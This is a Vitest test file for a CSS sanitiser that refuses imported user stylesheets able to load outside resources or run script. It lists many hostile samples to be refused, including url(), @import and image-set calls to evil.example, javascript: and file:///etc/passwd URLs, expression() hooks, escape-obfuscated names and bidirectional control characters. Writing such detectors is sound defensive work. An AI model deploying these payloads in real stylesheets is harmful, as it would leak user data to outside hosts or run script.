import { describe, expect, it, vi } from 'vitest'
import { hasHiddenCharacter, hiddenCharacterLine, scanBoostCss, unreadableCode, type CssRefusal } from './boost-css'

const refusedAs = (css: string): CssRefusal | 'ok' => {
  const scan = scanBoostCss(css)
  return scan.ok ? 'ok' : scan.rule
}

/** Writes a name with every letter as a hexadecimal escape: the same name for a CSS parser, nothing a text search would find. */
const escaped = (name: string): string => [...name].map((ch) => `\\${ch.codePointAt(0)!.toString(16)} `).join('')

describe('what an imported stylesheet may not do', () => {
  describe('@import', () => {
    it.each([
      '@import url(https://evil.example/x.css);',
      '@import "https://evil.example/x.css";',
      "@import 'x.css' screen;",
      '@IMPORT "x.css";',
      '@Import"x.css";',
      '@import\n"x.css";',
      '@media screen { @import "x.css"; }',
      '/* a */ @import /* b */ "x.css";',
      '@\\69mport "x.css";',
      '@i\\6d port "x.css";',
      '@\\000069mport "x.css";',
      `@${escaped('import')}"x.css";`
    ])('refuses %j', (css) => {
      expect(refusedAs(css)).toBe('import')
    })
  })

  describe('url()', () => {
    it.each([
      'a { background: url(https://evil.example/leak?a) }',
      'a { background: url("https://evil.example/leak") }',
      "a { background: url( 'https://evil.example/leak' ) }",
      'a { background: URL(http://evil.example/) }',
      'a { background: Url(http://evil.example/) }',
      'a { background: url(//evil.example/leak) }',
      'a { background: url(data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=) }',
      "a { background: url('data:text/css,a{}') }",
      'a { background: url(javascript:alert(1)) }',
      'a { background: url(file:///etc/passwd) }',
      'a { background: url(blob:https://x/1) }',
      'a { background: url(/relative/path.png) }',
      'a { background: url(image.png) }',
      'a { background: url(#fragment) }',
      'a { mask: url(#m) }',
      'a { filter: url(#blur) }',
      'a { cursor: url(x.cur), auto }',
      'a { list-style-image: url(x.png) }',
      'a { content: url(x.png) }',
      'a { border-image-source: url(x.png) }',
      '@font-face { font-family: x; src: url(https://evil.example/f.woff2) }',
      "@font-face { font-family: x; src: local(Arial), url('f.woff2') }",
      '@namespace url(http://www.w3.org/1999/xhtml);',
      'a[href^="https://x"] { background: url(https://evil.example/?l=1) }',
      'a { background: url(https://evil.example/',
      'a { background: url(',
      'a { background: u\\72l(https://evil.example/) }',
      'a { background: \\75 rl(https://evil.example/) }',
      'a { background: \\55 \\52 \\4c (https://evil.example/) }',
      `a { background: ${escaped('url')}(https://evil.example/) }`,
      'a { background: \\000075\\000072\\00006c(https://evil.example/) }',
      'a { background: u\\RL(https://evil.example/) }',
      '/* comment */ a { background: /* c */ url(https://evil.example/) /* d */ }',
      'a { content: "x\\\n"; background: url(https://evil.example/) }',
      'a { content: "unterminated\n; background: url(https://evil.example/) }',
      'a { content: "ended by a carriage return\r; background: url(https://evil.example/) }',
      'a { content: "ended by a form feed\f; background: url(https://evil.example/) }',
      'a { content: "ended by CRLF\r\n; background: url(https://evil.example/) }',
      'a { color: red } /* closed */ b { background: url(x) }'
    ])('refuses %j', (css) => {
      expect(refusedAs(css)).toBe('url')
    })

    it('counts a carriage return alone, and a form feed, as the end of a line', () => {
      expect(scanBoostCss('a {\r color: red;\r background: url(https://evil.example/) }')).toEqual({ ok: false, rule: 'url', line: 3 })
      expect(scanBoostCss('a {\f color: red;\f background: url(https://evil.example/) }')).toEqual({ ok: false, rule: 'url', line: 3 })
    })

    it('reports the line where the construct begins', () => {
      const scan = scanBoostCss('a {\r\n  color: red;\r\n  background: url(https://evil.example/);\r\n}')
      expect(scan).toEqual({ ok: false, rule: 'url', line: 3 })
    })
  })

  describe('functions that take an address as a string', () => {
    it.each([
      'a { background: image-set("https://evil.example/a.png" 1x) }',
      'a { background: -webkit-image-set("https://evil.example/a.png" 1x) }',
      'a { background: IMAGE-SET("a.png" 1x) }',
      'a { background: i\\6d age-set("a.png" 1x) }',
      'a { background: src("https://evil.example/a.png") }',
      'a { background: image("https://evil.example/a.png") }',
      'a { background: cross-fade("a.png", "b.png", 50%) }',
      'a { background: -webkit-image-set(url(x.png) 1x) }',
      'a { background: image-set(url(x.png) 1x) }',
      'a { background: -webkit-cross-fade("a.png", "b.png", 50%) }'
    ])('refuses %j', (css) => {
      expect(refusedAs(css)).toBe('image-function')
    })

    it('refuses attr() read as an address, and only that use of attr()', () => {
      expect(refusedAs('a { background: attr(data-bg type(<url>)) }')).toBe('attr-url')
      expect(refusedAs('a { background: attr(data-bg TYPE(<url>), none) }')).toBe('attr-url')
      expect(refusedAs('a { background: attr(data-bg url) }')).toBe('attr-url')
      expect(refusedAs('a { content: attr(title) }')).toBe('ok')
      expect(refusedAs('a { width: attr(data-w px, 10px) }')).toBe('ok')
      expect(refusedAs('a::after { content: attr(data-x type(<string>)) }')).toBe('attr-url')
    })

    it('knows whether an attr() is open at any depth, and that it is closed once it is', () => {
      // Still inside the attr() after a function of its own has closed, and under other parentheses.
      expect(refusedAs('a { background: attr(data-bg calc(1 + (2)) url) }')).toBe('attr-url')
      expect(refusedAs('a { background: var(--x, attr(data-bg, (min(1px, 2px)) type(<url>))) }')).toBe('attr-url')
      expect(refusedAs('a { background: attr(data-a attr(data-b) url) }')).toBe('attr-url')
      // Closed: `type(` and the word `url` are again what they are anywhere else.
      expect(refusedAs('a { content: attr(title) } b { grid-area: type(x); animation-name: url }')).toBe('ok')
      expect(refusedAs('a { content: attr(data-a attr(data-b)) } b { animation-name: url }')).toBe('ok')
      // A closing parenthesis with nothing open closes no attr().
      expect(refusedAs('a { x: ) ) attr(data-bg url) }')).toBe('attr-url')
    })
  })

  describe('script hooks of old engines', () => {
    it.each([
      'a { width: expression(alert(1)) }',
      'a { width: EXPRESSION(alert(1)) }',
      'a { width: e\\78 pression(alert(1)) }',
      'a { width: -ms-expression(alert(1)) }',
      `a { width: ${escaped('expression')}(alert(1)) }`
    ])('refuses %j as expression()', (css) => {
      expect(refusedAs(css)).toBe('expression')
    })

    it.each(['a { behavior: x }', 'a { BEHAVIOR : x }', 'a { -ms-behavior: x }', 'a { b\\65 havior: x }', 'a {\nbehavior\n:x }'])('refuses %j as behavior', (css) => {
      expect(refusedAs(css)).toBe('behavior')
    })

    it.each(['a { -moz-binding: x }', 'a { -MOZ-BINDING: x }', 'a { -moz-b\\69 nding: x }', 'a { -moz-binding : x }'])('refuses %j as -moz-binding', (css) => {
      expect(refusedAs(css)).toBe('binding')
    })
  })

  describe('hidden characters', () => {
    it.each([
      ['NUL', 'a { color: red\u0000 }'],
      ['an escape character', 'a { color: red\u001b }'],
      ['a vertical tab', 'a {\u000b}'],
      ['a right-to-left override', 'a { content: "\u202Eabc" }'],
      ['a bidirectional isolate', 'a { content: "\u2066abc" }'],
      ['a line separator', 'a { content: "\u2028" }'],
      ['a paragraph separator', 'a { content: "\u2029" }']
    ])('refuses %s', (_name, css) => {
      expect(refusedAs(css)).toBe('hidden-character')
    })

    // Found in honest stylesheets: taken, and the person is warned of the line (boost-share.ts, `invisibleWarnings`).
    it.each([
      ['a zero-width space', 'a { co\u200Blor: red }'],
      ['a byte-order mark', 'a { color: red }\uFEFF'],
      ['a soft hyphen', 'a { colo\u00ADr: red }'],
      ['a tag character', 'a { content: "\u{E0041}" }'],
      ['the joiner of a composed emoji', 'a::after { content: "👩\u200D💻" }']
    ])('takes %s, which the warning finds', (_name, css) => {
      expect(refusedAs(css)).toBe('ok')
      expect(hiddenCharacterLine(`a {}\n${css}`)).toBe(2)
    })

    it('names the line of the first character it refuses, whichever kind comes first', () => {
      expect(scanBoostCss('a {}\nb { content: "\u0001" }\nc { content: "\u202E" }')).toEqual({ ok: false, rule: 'hidden-character', line: 2 })
      expect(scanBoostCss('a {}\nb { content: "\u2029" }\n\nc { content: "\u0001" }')).toEqual({ ok: false, rule: 'hidden-character', line: 2 })
    })

    it('tells what makes code unreadable, with its line: a character that reorders a line, a line end that is not drawn', () => {
      for (const hidden of ['\u202A', '\u202B', '\u202C', '\u202D', '\u202E', '\u2066', '\u2067', '\u2068', '\u2069']) expect(unreadableCode(`a()\nb(${hidden})`), hidden.codePointAt(0)!.toString(16)).toEqual({ kind: 'reorders', line: 2 })
      for (const hidden of ['\u2028', '\u2029']) expect(unreadableCode(`a()\n\n// note${hidden}b()`), hidden.codePointAt(0)!.toString(16)).toEqual({ kind: 'line-end', line: 3 })
      expect(unreadableCode('a(\u2028)\nb(\u202E)')).toEqual({ kind: 'line-end', line: 1 })
      expect(unreadableCode('a(\u202E)\nb(\u2028)')).toEqual({ kind: 'reorders', line: 1 })
      for (const fine of ['document.title = "é à ç 日本語 😀"\n\t\r', 'a\u200Bb', 'a\u00ADb', '\uFEFFa', '👩\u200D💻', 'a\u200Eb']) expect(unreadableCode(fine), fine).toBeNull()
    })

    it('exposes the same test for the other fields of a Tweak', () => {
      expect(hasHiddenCharacter('document.title = "x\u202E"')).toBe(true)
      expect(hasHiddenCharacter('document.title = "é à ç 日本語 😀"\n\t\r')).toBe(false)
    })
  })

  it('judges the whole text, not its first part', () => {
    const benign = 'a { color: red }\n'.repeat(5000)
    expect(refusedAs(benign)).toBe('ok')
    expect(refusedAs(`${benign}b { background: url(https://evil.example/) }`)).toBe('url')
    expect(scanBoostCss(`${benign}@import "x";`)).toMatchObject({ ok: false, rule: 'import', line: 5001 })
  })
})

describe('what an imported stylesheet may do', () => {
  it.each([
    '',
    '   \n\t',
    'a { color: red }',
    'body { background: linear-gradient(to right, #000, #fff) !important }',
    '.sm\\:flex, .w-1\\/2, .\\31 0 { display: flex }',
    '@media (min-width: 100px) and (prefers-color-scheme: dark) { a { color: #ffffff } }',
    '@supports (display: grid) { div { display: grid } }',
    ':root { --accent: #ff9f1a; --gap: calc(1px + 2px) } a { color: var(--accent) }',
    'html { filter: invert(1) hue-rotate(180deg) } img { filter: invert(1) hue-rotate(180deg) }',
    '@font-face { font-family: "Ma police"; src: local("Helvetica Neue"), local(Arial) }',
    'a[href^="http://"], a[href*="url("], img[src$=".png"], [srcset], [data-url] { outline: 1px solid red }',
    'a::after { content: "url(https://evil.example/x) @import expression(1)"; }',
    "a::after { content: 'image-set(\"x\")'; }",
    '/* url(https://evil.example/) @import "x"; behavior: x */ a { color: red }',
    'a { image-rendering: pixelated; list-style: none; cursor: pointer }',
    'a:not(.src):is(.image, .url) { color: red }',
    '#url, .import, .expression, .behavior { color: red }',
    'a { transition: all .2s; grid-template-areas: "a b" "c d"; animation: spin 1s linear infinite }',
    '@keyframes spin { to { transform: rotate(360deg) } }',
    '@layer base, components; @layer base { a { color: red } }',
    '@container (min-width: 400px) { a { color: red } }',
    'a { color: rgb(0 0 0 / 50%); inset: 0; aspect-ratio: 16 / 9 }',
    'a { font-family: "Lucium Inter", system-ui, sans-serif; text-transform: uppercase }',
    'a { content: "日本語 é à ç 😀" }',
    '.a\\{b { color: red }',
    '.col-12\\@md { width: 100% }'
  ])('accepts %j', (css) => {
    expect(refusedAs(css)).toBe('ok')
  })

  it('does not take a word for a function without its parenthesis', () => {
    expect(refusedAs('a { background: url }')).toBe('ok')
    expect(refusedAs('a { background: url (x) }')).toBe('ok')
    expect(refusedAs('a { behavior-x: 1; imports: 2 }')).toBe('ok')
  })

  it('does not go back over the open parentheses at each name: nested functions are read in one pass', () => {
    // Counted, not timed: nothing that reads an array from end to end may be called once per name of the text.
    const names = ['includes', 'indexOf', 'lastIndexOf', 'some', 'every', 'find', 'findIndex', 'findLast', 'filter'] as const
    const nested = 'a('.repeat(5000)
    const underAttr = `${'a('.repeat(2500)}attr(${'b '.repeat(2500)}`
    const walks = names.map((name) => vi.spyOn(Array.prototype, name))
    // Nothing but the two scans runs between the spies and their count: the test runner uses these functions too.
    const scans = [scanBoostCss(nested), scanBoostCss(underAttr)]
    const calls = walks.reduce((sum, walk) => sum + walk.mock.calls.length, 0)
    for (const walk of walks) walk.mockRestore()
    expect(scans).toEqual([{ ok: true }, { ok: true }])
    expect(calls).toBeLessThan(10)
  })

  it('is not slowed down by pathological input', () => {
    const started = Date.now()
    for (const css of ['a{'.repeat(40_000), '('.repeat(100_000), '"'.repeat(100_000), '/*'.repeat(50_000), '\\'.repeat(100_000), '@'.repeat(100_000), 'u\\72'.repeat(20_000), 'url'.repeat(30_000)]) scanBoostCss(css)
    expect(Date.now() - started).toBeLessThan(3000)
  })
})
